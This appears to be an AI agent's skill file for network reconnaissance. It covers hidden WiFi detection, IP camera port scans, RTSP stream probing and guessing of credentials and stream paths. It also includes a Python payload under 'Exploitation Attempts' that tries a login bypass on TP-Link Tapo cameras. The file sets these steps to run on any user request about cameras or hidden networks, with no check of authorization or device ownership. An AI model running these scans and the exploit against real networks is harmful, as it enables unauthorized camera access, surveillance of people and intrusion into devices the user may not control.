---
name: network-recon
description: "Network reconnaissance: hidden WiFi networks, IP camera discovery, RTSP probing, network accessibility assessment."
version: 1.0.0
author: Daedalus Agent
license: MIT
platforms: [linux]
metadata:
  daedalus:
    tags: [network, reconnaissance, wifi, ip-camera, rtsp, hidden-networks, pentest]
---

# Network Reconnaissance Skill

Discover hidden networks, IP cameras, and network-accessible devices using native Linux tools and common reconnaissance techniques.

## When to Use This Skill

Trigger when the user:
- Wants to find hidden/unnamed WiFi networks
- Asks about IP cameras on the network
- Wants to probe RTSP streams or camera endpoints
- Asks about network accessibility beyond the local LAN
- Wants to discover WiFi devices beyond standard scanning

## Hidden WiFi Network Detection

Hidden networks don't broadcast SSID but still appear in probe responses:

```bash
# Primary scan - shows all detectable networks
nmcli -t -f SSID,SIGNAL,BSSID,CHAN,SECURITY dev wifi list

# Hidden networks show empty SSID field
nmcli -t -f SSID dev wifi list | grep "^:"

# Detailed scan to identify Multi-BSS APs
sudo iw wlan0 scan dump 2>/dev/null | grep -E "^BSS|^\tSSID:" | head -50
```

**Multi-BSS APs** broadcast multiple BSSIDs with different profiles - some may be hidden guest/IoT networks:

```bash
# Look for Co-Hosted BSS indicators
sudo iw wlan0 scan 2>/dev/null | grep -E "Co-Hosted BSS|Max Co-Hosted" -B5 -A5
```

## IP Camera Discovery

Cameras typically use these ports:
- **554** - RTSP (video stream)
- **80/8080/8800** - HTTP admin interfaces
- **2020** - TP-Link Tapo cloud protocol
- **3702** - ONVIF WS-Discovery
- **9000** - Custom streaming (some brands)

```bash
# Scan for cameras on local network
nmap -p 554,80,8080,8800,2020,9000,3702 192.168.0.0/24

# Probe RTSP servers
echo "OPTIONS rtsp://IP:554/ RTSP/1.0" | nc IP 554

# Check manufacturer OUI
ip neighbor show
# 30:68:93 = TP-Link/Tapo
# 00:D0:B8 = D-Link
# A0:D0:DC = Amazon
```

## RTSP Camera Testing

Test RTSP authentication and stream availability:

```bash
# Test OPTIONS without auth
echo -e "OPTIONS rtsp://IP:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n" | nc -w 2 IP 554

# Test with credentials
ffmpeg -rtsp_transport tcp -i "rtsp://user:pass@IP:554/stream" -vframes 1 /tmp/test.jpg

# Find stream paths
for path in stream1 stream2 live h264 video1 preview; do
    ffmpeg -i "rtsp://IP:554/$path" -vframes 1 /tmp/test 2>&1 | head -5
done
```

## Network Accessibility Assessment

Check for access to other networks:

```bash
# VPN tunnels
systemctl list-units --type=service --state=running | grep -iE "vpn|wireguard|openvpn"

# SSH tunnels
ps aux | grep -E "ssh.*-w"

# Available interfaces
ip route show
ip link show

# Container networks
podman network ls
docker network ls

# Libvirt networks  
virsh net-list 2>/dev/null
```

## Exploitation Attempts

For TP-Link Tapo cameras specifically:

```python
# Cloud protocol bypass (CVE-2022-30697)
import socket, json

payload = {
    'method': 'login',
    'params': {'appType': 'Tapo_Ios', 'cloudUserName': '', 'cloudPassword': ''},
    'seq': 1
}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('IP', 2020))
s.send((json.dumps(payload) + '\r\n').encode())
response = s.recv(2048)
```

**Common Tapo ports:** 2020 (cloud), 554 (RTSP), 8800 (admin), 8080 (HTTP)

## Pitfalls

1. **Monitor mode may be blocked** — Many WiFi chips don't support it on managed interfaces. Requires `iw wlan0 interface add mon0 type monitor`.

2. **Cloud protocol is often disabled** — TP-Link cameras may not respond on port 2020 unless cloud features are explicitly enabled.

3. **Modern cameras patch CVEs quickly** — The CVE-2022-30697 exploit only works on certain firmware versions.

4. **RTSP auth is server-side** — Even with valid credentials, the stream path may be wrong. Try common paths: `/stream1`, `/live`, `/h264`.

5. **No network access = no external cameras** — Without VPN/SSH tunnel, only local network devices are reachable.

## References

See `references/wifi-signatures.md` for MAC OUI signatures and `references/camera-paths.md` for common RTSP stream endpoints.